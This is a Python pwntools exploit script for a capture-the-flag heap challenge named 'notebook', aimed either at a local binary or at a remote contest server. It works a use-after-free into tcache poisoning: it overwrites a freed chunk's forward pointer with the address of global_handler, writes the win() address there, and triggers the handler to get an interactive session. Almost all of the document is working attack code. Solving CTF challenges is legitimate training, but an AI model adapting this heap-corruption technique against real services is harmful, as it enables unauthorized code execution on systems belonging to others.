#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./notebook', checksec=False)
#context.log_level="debug"
elf = ELF("./notebook_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it',13545)
    return process(elf.path)

p = conn()

"""free(A)

UAF write:
A->fd = &target

malloc → A
malloc → target

→ write(win) su target
"""

#--------STEP 1: POINT THE MACCOT TO GLOBAL HANDLER MEMORY REGION ---------

#GLOBAL_HANDLER = elf.sym.global_handler-0x10
GLOBAL_HANDLER = elf.sym.global_handler 
win = elf.sym.win

#CREATE(1)
p.sendlineafter(b'> ', b'1')   #create malloc
p.sendlineafter(b'index: ', b'1')
p.sendafter(b'data: ',b'A') # type: ignore
#p.sendafter(b'data: ', p64(win).ljust(32, b'X')) # type: ignore

#CREATE(2)
p.sendlineafter(b'> ', b'1')   #create malloc
p.sendlineafter(b'index: ', b'2')
p.sendafter(b'data: ',b'A') # type: ignore
#p.sendafter(b'data: ', p64(win).ljust(32, b'X')) # type: ignore

#FREE(1)
p.sendlineafter(b'> ', b'2')    #free malloc
p.sendlineafter(b'index: ', b'1')
#gb.attach(p)

#FREE(2)
p.sendlineafter(b'> ', b'2')    #free malloc
p.sendlineafter(b'index: ', b'2')
#gb.attach(p)

#EDIT(1)
p.sendlineafter(b'> ', b'3') #edit malloc (the ones freeded)
p.sendlineafter(b'index: ', b'2') # head della lista
#p.sendafter(b'data: ', p64(GLOBAL_HANDLER).ljust(32, b'X')) # type: ignore
p.recvuntil(b'data: ')
p.send(p64(GLOBAL_HANDLER))

#--------STEP 2: OVERWRITE MALLOC WITH WIN() ADDRESS ---------

#CREATE(1)
p.sendlineafter(b'> ', b'1')   #create malloc
p.sendlineafter(b'index: ', b'1')
p.sendafter(b'data: ',b'A') 

log.info(hex(elf.sym.global_handler))
log.info(hex(win))

#CREATE(2)
p.sendlineafter(b'> ', b'1')   #create malloc
p.sendlineafter(b'index: ', b'2')
p.sendafter(b'data: ',p64(win)) # type: ignore
#p.sendafter(b'data: ',p64(win).ljust(32, b'X')) # type: ignore
#gdb.attach(p)
#pause()

#--------STEP 3: TRIGGER THE GLOBAL HANDLER THAT CONTAINS WIN() ADDRESS ---------

p.sendlineafter(b'> ', b'5')                       
#p.sendafter(b'data: ', p64(win).ljust(32, b'X')) # type: ignore
#p.sendlineafter(b'> ', b'4')            

#print(p.recvall(timeout=2).decode(errors='replace'))

p.interactive()
